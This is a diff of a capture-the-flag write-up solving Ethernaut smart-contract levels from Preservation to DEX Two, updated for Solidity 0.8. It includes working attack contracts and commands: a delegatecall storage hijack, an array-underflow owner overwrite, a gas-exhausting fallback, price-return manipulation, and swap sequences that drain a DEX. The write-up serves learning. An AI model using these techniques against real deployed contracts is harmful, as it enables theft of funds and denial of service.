@@ -306,9 +306,9 @@ contract AttackGatekeeperTwo {
 
     function passGateThree() public view returns(bool) {
         // if a ^ b = c then a ^ c = b;
-        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1 
+        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
         // can be rewritten as
-        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey) 
+        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey)
         uint64 key = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max;
         return uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ key == type(uint64).max;
     }
@@ -322,25 +322,28 @@ The solution is to just approve another address to take the coins out on behalf 
 
 
 ## 16. Preservation
-You need to understand how `delegatecall` works and how it affects storage variables on the calling contract to be able to solve this level. Essentially, when you try to do `delegatecall` and call the function `setTime()`, what's happening is that it is not just applying the logic of `setTime()` to the storage variables of the calling contract, it is also preserving the index of `storedTime` in the calling contract and using that as a reference as to which variable should it update. In short, the `LibraryContract` is trying to modify the variable at index 0 but on the calling contract, index 0 is the address of `timeZone1Library`. So first you need to call `setTime()` to replace `timeZone1Library` with a malicious contract. In this malicious contract, `setTime()` which will modify index 3 which on the calling contract is the owner variable!
+You need to understand how `delegatecall` works and how it affects storage variables on the calling contract to be able to solve this level. Essentially, when you try to do `delegatecall` and call the function `setTime()`, what's happening is that it is not just applying the logic of `setTime()` to the storage variables of the calling contract, it is also preserving the index of the `storedTime` variable in the calling contract and using that as a reference as to which variable should it update.
+
+In short, the `LibraryContract` is trying to modify the variable at index 0 but on the calling contract, index 0 is the address of `timeZone1Library`. So first you need to call `setTime()` to replace `timeZone1Library` with a malicious contract. In this malicious contract, `setTime()` which will modify index 3 which on the calling contract is the owner variable!
 
 1. Deploy the malicious library contract
-2. Convert the address into uint.
-3. Call either `setFirstTime()` or `setSecondTime()` with the uint value of (2).
-4. Now that the address of `timeZone1Library` has been modified to the malicious contract, call `setFirstTime()` with the uint value of your player address.
+2. Convert malicious contract address into uint.
+3. Call either `setFirstTime()` or `setSecondTime()` with the uint value of the malicious contract address (step 2)
+4. Now that the address of `timeZone1Library` has been modified to the malicious contract, get the uint value of your player address
+5. call `setFirstTime()` with the uint value of your player address.
 ```
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
-contract LibraryContract {
+contract AttackPreservation {
 
-  // stores a timestamp 
-  address doesNotMatterWhatThisIsOne;
-  address doesNotMatterWhatThisIsTwo;
-  address maliciousIndex;
+    // stores a timestamp
+    address doesNotMatterWhatThisIsOne;
+    address doesNotMatterWhatThisIsTwo;
+    address maliciousIndex;
 
-  function setTime(uint _time) public {
-    maliciousIndex = address(_time);
-  }
+    function setTime(uint _time) public {
+        maliciousIndex = address(uint160(_time));
+    }
 }
 
 await contract.setFirstTime("<insert uint value of your malicious library contract>")
@@ -349,7 +352,7 @@ await contract.setFirstTime("<insert uint value of your player>)
 ```
 
 ## 17. Recovery
-Notice how there exists a function called `destroy()` which alls `selfdestruct()`. `selfdestruct()` is a way for you to "destroy" a contract and retrieve the entire eth balance at that address. So what you need to do is encode it into the `data` payload initiate a transaction to it. You need to analyse your transaction hash to determine the address of the lost contract. Once you have that, you should be able to solve this level.
+Notice how there exists a function called `destroy()` which calls `selfdestruct()`. `selfdestruct()` is a way for you to "destroy" a contract and retrieve the entire eth balance at that address. So what you need to do is encode it into the `data` payload initiate a transaction to it. You need to analyse your transaction hash to determine the address of the lost contract. Once you have that, you should be able to solve this level.
 ```
 data = web3.eth.abi.encodeFunctionCall({
     name: 'destroy',
@@ -367,53 +370,29 @@ await web3.eth.sendTransaction({
 ```
 
 ## 18. MagicNumber
-Don't really think this is a security challenge, it's more of a general coding challenge about how you can deploy a very small sized contract! I probably won't ever need to use this so I'm going to skip this floor. Nonetheless, if you're interested to do this challenge, read this [solution](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2) by Nicole Zhu. 
+I don't really think this is a security challenge, it's more like a general coding challenge about how you can deploy a very small sized contract! I'm going to skip this floor but if you're interested to do this challenge, read this [solution](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2) by Nicole Zhu.
 
 
 ## 19. AlienCodex
-
 In order to solve this level, you need to understand about 3 things:
 1. Packing of storage variables to fit into one storage slot of 32bytes
 2. How values in dynamic arrays are stored
-3. How to modify an item outside of the size of the array.
+3. How to modify an item outside of the size of the array.ss
 
-This [example](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/) & the [solidity documentation](https://solidity.readthedocs.io/en/latest/miscellaneous.html#bytes-and-string) should prove useful to understanding point 2. However, I would like to point out that there is a mistake in the example. If you can find the mistake, you probably have a solid understanding of point 2. Note that the solution below uses web3 to interact with the contract because there was an error on Ethernaut (0.5.0)'s end preventing me from getting an instance.
+This [example](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/) should prove useful to understanding point 2.
 ```
-// After deploying your contract, you need to determine which is your instance contract. 
-// Find the transaction on etherscan, click on Internal Transactions
-// Look for the line "create_0_0... the To address represents your deployed contract
+// What is in slot 0 of my storage?
+await web3.eth.getStorageAt(instance, 0); // 0x000000000000000000000001xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx where the x represents your address and 1 represents contact = true
 
-// First you need to make contact
-var instance = "<insert contract instance here">
-
-// Check who is owner
-var ownerPayload = web3.eth.abi.encodeFunctionCall({
-    name: 'owner',
-    type: 'function',
-    inputs: []
-}, []); // 0x8da5cb5b
-
-await web3.eth.call({to: instance, data: ownerPayload});
-
-var makeContactPayload = web3.eth.abi.encodeFunctionCall({
-    name: 'make_contact',
-    type: 'function',
-    inputs: []
-}, []); // 0x58699c55
-
-await web3.eth.sendTransaction({to: instance, from: player, data: makeContactPayload});
-
-var concatenatedStorage = await web3.eth.getStorageAt(instance, 0); // 0x000000000000000000000001xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx where the x represents your address and 1 represents contact = true
-
-// Number of elements in dynamic array (codex) is stored at index 1 
-// Actual elements stored in dynamic array (codex) can be found at index uint256(keccak256(1)); // 
+// Number of elements in dynamic array (codex) is stored at index 1 i.e. web3.eth.getStorageAt(instance, 1)
+// Actual elements stored in dynamic array (codex) can be found at index uint256(keccak256(1)); //
 80084422859880547211683076133703299733277748156566366325829078699459944778998
 // New elements added to dynamic array (codex) can be found at index uint256(keccak256(1)) + index in array e.g.
 // First element is found at uint256(keccak256(1)) + 0;
 // Second element is found at uint256(keccak256(1)) + 1;
-// Third element is found at uint256(keccak256(1)) + 2; 
+// Third element is found at uint256(keccak256(1)) + 2;
 
-// We want to modify storage slot 0 since that is where owner is stored at. 
+// We want to modify storage slot 0 since that is where owner is stored at.
 // We need a value N such that uint256(keccak256(1)) + N = 0
 // 0 (or max value for uint256) - uint256(keccak256(1)) = N
 
@@ -435,7 +414,7 @@ var replaceIndexZeroPayload = web3.eth.abi.encodeFunctionCall({
     }]
 }, [offset.toString(), newElementAtIndexZero]);
 
-// If you try to do 
+// If you try to do
 // await web3.eth.sendTransaction({to: instance, from: player, data: replaceIndexZeroPayload});
 // It will fail because you are trying to modify an index that is greater than the length of the array
 // I mean there's a reason why there is a retract() function right? haha.
@@ -460,47 +439,79 @@ await web3.eth.call({to: instance, data: ownerPayload})
 ```
 
 ## 20. Denial
-This level is very similar to the levels Force and King. The problem with the Denial contract is the fact that instead of transferring using `.send()` or `.transfer`() which has a limit of 2300 gas, it used `.call()` and if no limit on the gas is specified, it will send all gas along with it. So now the question is, what can you do in your fallback function to consume all the gas? `assert()` of course! 
-
-Note that you should actually also avoid using `.send()` and `.transfer()` now because of the recent Istanbul Hardfork which made 2300 gas insufficient. You can read more about this [here](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/).
-
+This level is very similar to the levels Force and King. The problem with the Denial contract is the fact that instead of transferring using `.send()` or `.transfer`() which has a limit of 2300 gas, it used `.call()` and if no limit on the gas is specified, it will send all gas along with it. I used `assert(false)` in my old solution and it used to work but no longer works due to a [breaking change](https://blog.soliditylang.org/2020/12/16/solidity-v0.8.0-release-announcement/) in solidity v0.8.0 so we need another way to expand all available gas. The simplest way to do this is to run an infinite loop.
 ```
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract AttackDenial {
-    
-    address public victim;
-    
-    constructor(address _victim) public payable {
-        victim = _victim;
-        bytes memory payload = abi.encodeWithSignature("setWithdrawPartner(address)", address(this));
-        victim.call(payload);
-    }
-    
-    
-    fallback() external payable {
-        assert(false);
+    receive() external payable {
+        while(true){}
     }
 }
+
+await contract.setWithdrawPartner("<address of your deployed AttackDenial contract.>");
 ```
 
 ## 21. Shop
-This level is very similar to that of Elevator where you return different value everytime you call the function. The only problem now is the fact that you are only given 3k gas which is not enough to modify any state variables. Even if you wanted to, you can't because the interface requires a view function. Notice how there is actually a flag on the Shop contract that is being modified if it passes the first check? Yes the `isSold` variable! That is the variable that we will use to return different prices. Make sure you import the `Buyer` interface and `Shop` contract. Note that because of the recent Byzantine hardfork, this solution will actually fail because the `price()` function requires 3.8k gas but only 3k gas is given. 
+This level is very similar to that of Elevator where you return different value everytime you call the function. Since `isSold` is updated first before the price is set, we are able to take advantage of this and return different values for `_buyer.price()` based on what the value of `shop.isSold()` returns. You might have to manually increase the gas limit on metamask. This is a common issue because metamask cannot estimate the gas cost when you using `.call`.
 
 ```
+pragma solidity ^0.8.0;
+
+interface Buyer {
+  function price() external view returns (uint);
+}
+
 contract AttackShop is Buyer {
-    Shop public shop;
-    
-    constructor(Shop _shop) public {
-        shop = _shop;
+    address public victim;
+
+    constructor(address _victim) {
+        victim = _victim;
     }
-    
+
     function buy() public {
-        shop.buy();
+        bytes memory payload = abi.encodeWithSignature("buy()");
+        victim.call(payload);
     }
 
     function price() public view override returns(uint) {
-        return shop.isSold() ? 1 : 101;
+        bytes memory payload = abi.encodeWithSignature("isSold()");
+        (, bytes memory result) = victim.staticcall(payload);
+        bool sold = abi.decode(result, (bool));
+        return sold ? 1 : 101;
     }
 }
+```
+
+## 22. DEX
+
+The exploit on this level is the reliance on a single oracle source for token price. Let's quickly walk through why this is a problem. Originally we were given 10A and 10B and the dex has 100A and 100B where A and B represents token 1 and 2 respectively. This gives us a price of 1A = 1B.
+
+If we swap all of our A to B, our new balance is 0A and 20B. The dex has 110A and 90B. Now if we were to swap all our B back to A, the dex is actually quoting us a better price than what we originally swapped at (1:1). Our new balance is 24A and 0B while the dex has 86A and 110B. Repeat this a few more times by swapping your entire balance and you'll be able to drain the funds of the dex.
+```
+let a = await contract.token1();
+let b = await contract.token2();
+await contract.approve(instance, "1000000000000");
+await contract.swap(a, b, 10);
+await contract.swap(b, a, 20);
+await contract.swap(a, b, 24);
+await contract.swap(b, a, 30);
+await contract.swap(a, b, 41);
+await contract.swap(b, a, 45); // the reason why we use 45 here instead of the entire balance of B of 65 is because the dex doesn't have enough a to give back to us. So we need to calculate the right amount of b to use to ensure that we can fully drain a i.e. 110/156*65 = 45.
+```
+
+## 23. DEX TWO
+This level is very similar to the previous level except you need to use a custom ERC20 token contract to drain the funds of the DEX. The reason why this is possible is because the swap doesn't require that the from / to has to be token1 and token2 so you can use a 3rd token and drain each side sequentially.
+
+```
+
+a = await contract.token1()
+b = await contract.token2()
+// Create a custom ERC20 token contract (C) and mint to yourself some tokens.
+c = "<insert custom token address here>"
+
+await c.approve(instance, 1000);
+await c.transfer(instance, 1);
+await contract.swap(c, a, 1);
+await contract.swap(c, b, 2);
 ```
